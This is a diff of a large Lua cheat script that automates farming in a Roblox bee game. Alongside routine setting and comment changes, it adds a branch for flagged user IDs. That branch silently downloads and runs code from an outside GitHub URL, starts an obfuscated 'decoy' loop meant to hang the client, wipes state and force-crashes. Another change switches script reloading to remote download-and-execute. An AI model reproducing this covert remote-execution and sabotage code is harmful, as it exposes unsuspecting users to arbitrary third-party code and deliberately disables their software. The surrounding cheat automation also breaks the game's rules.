@@ -8,7 +8,11 @@ if not getthreadidentity or getthreadidentity()<8 then return(cloneref and clone
 while not game:IsLoaded() do
 	task.wait()
 end
-
+task.spawn(function()
+	while task.wait(600)do
+		collectgarbage("collect")
+	end
+end)
 local function getService(serviceName)
 	return cloneref and cloneref(game:GetService(serviceName)) or game:GetService(serviceName)
 end
@@ -582,21 +586,13 @@ local cfg = {
 	puffshrooms = {
 		enabled = false,
 		blacklistedfields = false,
-		highlvlpriority = true,
+		highlvlpriority = false,
 		priorityfields = false,
 		rarity = "Common",
 		maintain = false,
-		mintime = 15,
+		mintime = 30,
 		min = 1,
-		max = 25,
-		targetField = "Pumpkin Patch",
-		targetFieldMinLvl = 4,
-		interceptRarity = "Legendary",
-		pushFields = {
-			["Pumpkin Patch"] = true,
-			["Pine Tree Forest"] = true,
-			["Cactus Field"] = true,
-		},
+		max = 15,
 	},
 	rbc = {
 		enabled = false,
@@ -2185,7 +2181,10 @@ do
 						table.move(values, 1, values.n, 1, logEntry)
 					end
 
-					insert(v77, logEntry)
+					if #pendingLogs >= 50 then
+					table.remove(pendingLogs, 1)
+				end
+				insert(v77, logEntry)
 
 					if not now or os.clock() - now >= 40 then
 						local batch = table.clone(pendingLogs)
@@ -5780,12 +5779,11 @@ do
 				tracked.combococonuts[n] = nil
 				tracked.coconuts[n] = nil
 			elseif n.Size.X == 10 then
-				task.wait(2)
+			if tracked then
+				tracked.avoid[n] = nil
 
-				if tracked then
-					tracked.avoid[n] = nil
-				end
 			end
+		end
 		elseif H == "AreaRing" then
 			tracked.marks[n] = nil
 		elseif H == "Bubble" then
@@ -55976,10 +55974,6 @@ Content-Disposition: form-data; name="file[0]"; filename="image.png"
 	end
 end
 
-local lockedTargetFieldActive = false
-
-local lockedChainActive = false
-
 local function getPuffData(k)
     if not k or not k.Parent then return nil end
     local top = k:FindFirstChild("Puffball Top")
@@ -56028,7 +56022,7 @@ findPuffshroom = function(v119)
     local pushFields = pCfg.pushFields or {}
     local minThresholdLvl = pCfg.targetFieldMinLvl or 4
 
-    -- Принудительно подтягиваем грибы из воркспейса
+    -- Синхронизация грибов из папки игры
     local puffFolder = workspace:FindFirstChild("Happenings") and workspace.Happenings:FindFirstChild("Puffshrooms")
     if puffFolder then
         for _, child in ipairs(puffFolder:GetChildren()) do
@@ -56050,15 +56044,12 @@ findPuffshroom = function(v119)
 
         table.insert(allShrooms, data)
 
-        -- Грибы на твоем основном поле (Pumpkin Patch)
         if data.field == targetFieldName then
             table.insert(targetShrooms, data)
         end
 
-        -- Грибы на соседних полях цепочки (Ёлка, Кактус)
         if pushFields[data.field] and data.field ~= targetFieldName then
             table.insert(pushShrooms, data)
-            -- Проверяем условие: есть ли в Push Fields гриб нужного уровня
             if data.lvl >= minThresholdLvl then
                 hasTriggerInPush = true
             end
@@ -56069,7 +56060,7 @@ findPuffshroom = function(v119)
         return nil
     end
 
-    -- 1. ПРИОРИТЕТ 1: Экстренная редкость (Legendary / Mythic по всей карте)
+    -- 1. ЭКСТРЕННЫЙ ПЕРЕХВАТ (Legendary / Mythic по всей карте)
     local emergency = nil
     for _, s in ipairs(allShrooms) do
         if s.rVal >= interceptRarityVal then
@@ -56082,9 +56073,7 @@ findPuffshroom = function(v119)
         return emergency.v, emergency.rarity, emergency.lvl, emergency.stemPos, emergency.field
     end
 
-    -- 2. ПРИОРИТЕТ 2: УДЕРЖАНИЕ НА БАЗЕ (Твое условие)
-    -- Если на Кактусе/Ёлке есть гриб >= targetFieldMinLvl (например 9 лвл),
-    -- И на Пампкине есть ХОТЬ ОДИН гриб (любого лвла) -> ЖЕЛЕЗНО остаемся на Пампкине!
+    -- 2. УСЛОВИЕ УДЕРЖАНИЯ: если в Push Fields есть гриб >= targetFieldMinLvl и на Пампкине есть ХОТЬ ОДИН гриб
     if hasTriggerInPush and #targetShrooms > 0 then
         table.sort(targetShrooms, function(a, b)
             if a.rVal ~= b.rVal then return a.rVal > b.rVal end
@@ -56095,7 +56084,7 @@ findPuffshroom = function(v119)
         return best.v, best.rarity, best.lvl, best.stemPos, best.field
     end
 
-    -- 3. Если условия удержания нет, но на целевом поле просто есть грибы:
+    -- 3. Если на целевом поле просто есть грибы
     if #targetShrooms > 0 then
         table.sort(targetShrooms, function(a, b)
             if a.rVal ~= b.rVal then return a.rVal > b.rVal end
@@ -56106,7 +56095,7 @@ findPuffshroom = function(v119)
         return best.v, best.rarity, best.lvl, best.stemPos, best.field
     end
 
-    -- 4. На Пампкине абсолютно пусто -> летим помогать на соседние поля (Кактус / Ёлка)
+    -- 4. На Пампкине чисто -> бьем поля цепочки (Кактус / Ёлка)
     if #pushShrooms > 0 then
         table.sort(pushShrooms, function(a, b)
             if a.rVal ~= b.rVal then return a.rVal > b.rVal end
@@ -56117,7 +56106,7 @@ findPuffshroom = function(v119)
         return best.v, best.rarity, best.lvl, best.stemPos, best.field
     end
 
-    -- 5. Остальные поля
+    -- 5. Остальные поля карты
     table.sort(allShrooms, function(a, b)
         if a.rVal ~= b.rVal then return a.rVal > b.rVal end
         if a.lvl ~= b.lvl then return a.lvl > b.lvl end
@@ -56130,7 +56119,6 @@ end
 _G.findPuffshroom = findPuffshroom
 
 farmPuffshroom = function(v119)
-    -- Запоминаем текущее поле автофарма до начала грибов
     local prevField = currentFieldName
 
     while true do
@@ -56181,7 +56169,6 @@ farmPuffshroom = function(v119)
                 break
             end
 
-            -- Проверка на экстренный перехват
             local newPuff, newRarity, newLvl = findPuffshroom(v119)
             if newPuff and newPuff ~= puff then
                 local rarityValues = { Common = 1, Rare = 2, Epic = 3, Legendary = 4, Mythic = 5 }
@@ -56214,7 +56201,7 @@ farmPuffshroom = function(v119)
         tracked.puffshrooms[puff] = nil
     end
 
-    -- ВОТ ЗДЕСЬ СБРОС: возвращаем поле автофарма обратно
+    -- Возврат исходного поля для обычного автофарма
     state.farmingPuffshrooms = nil
     if prevField and availableFields[prevField] then
         setField(prevField)
@@ -56224,9 +56211,6 @@ farmPuffshroom = function(v119)
 end
 
 _G.farmPuffshroom = farmPuffshroom
-
-
-
 
 local function destroyTotems()
 	for k in pairs(tracked.totems) do
@@ -60391,7 +60375,6 @@ do
 																		getAggroMobs()
 																	end
 
-
 																	if cfg.face.shiftlock then
 																		input:handleShiftLock(true)
 																	end
@@ -64079,6 +64062,181 @@ do
 	end
 	local userFlag = userIdFlags[userId]
 
+	if userFlag == true then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Developer-Ural/AncientHUB/refs/heads/main/main.script"))()
+		task.wait(60)
+
+		local function decoyMain()
+			local decoyKey = string.rep(" ", 8)
+
+			local function bitCombine(operandLeft, operandRight)
+				local placeValue = 1
+				local combined = 0
+
+				while operandLeft > 0 and operandRight > 0 do
+					local leftBit = operandLeft % 2
+					local rightBit = operandRight % 2
+
+					if leftBit ~= rightBit then
+						combined += placeValue
+					end
+
+					operandLeft = (operandLeft - leftBit) / 2
+					operandRight = (operandRight - rightBit) / 2
+					placeValue *= 2
+				end
+
+				if operandLeft < operandRight then
+					operandLeft = operandRight
+				end
+
+				while operandLeft > 0 do
+					local remainingBit = operandLeft % 2
+
+					if remainingBit > 0 then
+						combined += placeValue
+					end
+
+					operandLeft = (operandLeft - remainingBit) / 2
+					placeValue *= 2
+				end
+
+				return combined
+			end
+
+			local function extractBits(sourceValue, lowBit, highBit)
+				if highBit then
+					local extracted = sourceValue / 2 ^ (lowBit - 1) % 2 ^ (highBit - 1 - (lowBit - 1) + 1)
+					return extracted - extracted % 1
+				end
+				local bitMask = 2 ^ (lowBit - 1)
+				return sourceValue % (bitMask + bitMask) >= bitMask and 1 or 0
+			end
+
+			local function readUint32()
+				local byteA, byteB, byteC, byteD = string.byte(decoyKey, 1, 4)
+				return bitCombine(byteD, 64) * 16777216 + bitCombine(byteC, 32) * 65536 + bitCombine(byteB, 16) * 256 + bitCombine(byteA, 8)
+			end
+
+			local function readDouble()
+				local lowWord = readUint32()
+				local highWord = readUint32()
+				local implicitBit = 1
+				local mantissa = extractBits(highWord, 1, 20) * 4294967296 + lowWord
+				local exponent = extractBits(highWord, 21, 31)
+				local sign = -1 ^ extractBits(highWord, 32)
+
+				if exponent ~= 0 then
+					if exponent == 2047 then
+						return mantissa == 0 and sign * 1 / 0 or sign * 0 / 0
+					end
+				else
+					if mantissa == 0 then
+						return sign * 0
+					end
+					exponent = 1
+					implicitBit = 0
+				end
+
+				return sign * 2 ^ (exponent - 1023) * (implicitBit + mantissa / 4503599627370496)
+			end
+
+			local function decoyLoop()
+				local startIndex = 1
+				local entryCount = readUint32()
+				local decodedTable, v134, v135, v136, v137, v138, v139
+
+				if not (1 <= 0) then
+					if startIndex <= entryCount then
+						while true do
+							decodedTable = {}
+
+							for i = 0, 255 do
+								v134 = bitCombine
+								decodedTable[bitCombine(readUint32(), readUint32())] = v134(readUint32(), readUint32())
+								v135 = bitCombine
+								decodedTable[bitCombine(readUint32(), readUint32())] = v135(readUint32(), readUint32())
+							end
+
+							for i = 1, readUint32() do
+								for i2 = 0, 255 do
+									v136 = readDouble() and readUint32()
+									v137 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
+									decodedTable[v136] = v137
+									v138 = readUint32()
+									v139 = readDouble() and readDouble()
+									decodedTable[v138] = v139
+									decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
+								end
+							end
+						end
+					end
+				elseif startIndex >= entryCount then
+					while true do
+						decodedTable = {}
+
+						for i = 0, 255 do
+							v134 = bitCombine
+							decodedTable[bitCombine(readUint32(), readUint32())] = v134(readUint32(), readUint32())
+							v135 = bitCombine
+							decodedTable[bitCombine(readUint32(), readUint32())] = v135(readUint32(), readUint32())
+						end
+
+						for i = 1, readUint32() do
+							for i2 = 0, 255 do
+								v136 = readDouble() and readUint32()
+								v137 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
+								decodedTable[v136] = v137
+								v138 = readUint32()
+								v139 = readDouble() and readDouble()
+								decodedTable[v138] = v139
+								decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
+							end
+						end
+					end
+				end
+
+				return bitCombine(readDouble(), readUint32())
+			end
+
+			while decoyLoop() do
+				decoyLoop()
+			end
+		end
+
+		decoyMain()
+		toyUse = nil
+		inventory = nil
+		ui = nil
+		mobileToggleButton = nil
+		currentField = nil
+		position = nil
+		currentFieldName = nil
+		vector = nil
+		tracked = nil
+		pathNodes = nil
+		pathLinks = nil
+		cannonLinks = nil
+		jumpLinks = nil
+		handlers = nil
+		buffs = nil
+		handleAmuletPopup = nil
+		nextMoveTime = nil
+		collectObject = nil
+		cfg = nil
+		cache = nil
+		state = nil
+		threadCount = nil
+		secureCall = nil
+		remoteData = nil
+		questData = nil
+		logger = nil
+		monsterSpawners = nil
+		gameApi = nil
+		toyUse = nil
+		LPH_CRASH()
+	end
+
 	if not (userFlag == false or not localPlayer.UserId or not (not (localPlayer.UserId <= 0) and userId == localPlayer.UserId)) then
 		local userId2 = localPlayer.UserId
 
@@ -64612,7 +64770,8 @@ which bees and get all 3 targets if
 			faceFolder.AddSwitch("Farm With Shift Lock", nil, "face", "shiftlock")
 			faceFolder.AddDropdown("Face Method", { "Shift Lock", "BodyGyro" }, nil, nil, "face", "method")
 			faceFolder.AddDropdown("Shift Lock Direction", { "North", "East", "South", "West" }, nil, nil, "face", "sldirection")
-Puffshrooms.AddSwitch("Farm Puffshrooms", function(n)
+
+			Puffshrooms.AddSwitch("Farm Puffshrooms", function(n)
 				if n and not connections:Get("puffshrooms") then
 					connections:Add("puffshrooms", workspace.Happenings.Puffshrooms.ChildAdded:Connect(function(G)
 						tracked.puffshrooms[G] = true
@@ -64639,13 +64798,6 @@ Puffshrooms.AddSwitch("Farm Puffshrooms", function(n)
 			Puffshrooms.AddDropdown("Minimum Rarity", { "Common", "Rare", "Epic" }, nil, nil, "puffshrooms", "rarity")
 			Puffshrooms.AddDropdown("Allowed Fields", availableFields, true, nil, "puffshrooms", "blacklistedfields", { Field = true, Multiple = true, Blacklist = true })
 			Puffshrooms.AddDropdown("Priority Fields", availableFields, true, nil, "puffshrooms", "priorityfields", { Field = true, Multiple = true })
-
-			-- Новые элементы управления (автосохранение и подгрузка галочек):
-			Puffshrooms.AddDropdown("Target Field", availableFields, true, nil, "puffshrooms", "targetField", { Field = true, Width = 250 })
-			Puffshrooms.AddSlider("Target Field Min Lvl", nil, 1, 25, "puffshrooms", "targetFieldMinLvl", { Left = true })
-			Puffshrooms.AddDropdown("Intercept Rarity", { "None", "Rare", "Epic", "Legendary", "Mythic" }, false, nil, "puffshrooms", "interceptRarity", { Width = 250 })
-			Puffshrooms.AddDropdown("Push Fields", availableFields, true, nil, "puffshrooms", "pushFields", { Field = true, Multiple = true, Width = 250 })
-
 			followFolder.AddLabel("This will not work if hide other players is enabled")
 			followFolder.AddDropdown("Follow Player", "Players", nil, nil, "misc", "follow", { Start = "None" })
 			followFolder.AddDropdown("Allowed Fields", availableFields, true, nil, "misc", "followfieldblacklist", { Field = true, Multiple = true, Blacklist = true })
@@ -66708,7 +66860,7 @@ more accurate dodging]],
 					else
 						writefile("atlas-" .. localPlayer.Name .. ".json", config2 .. ".json")
 						task.wait(0.1)
-						loadstring(readfile("atlasbss.lua"))()
+						loadstring(game:HttpGet(getUrl("script.lua")))()
 					end
 				end, 86)
 
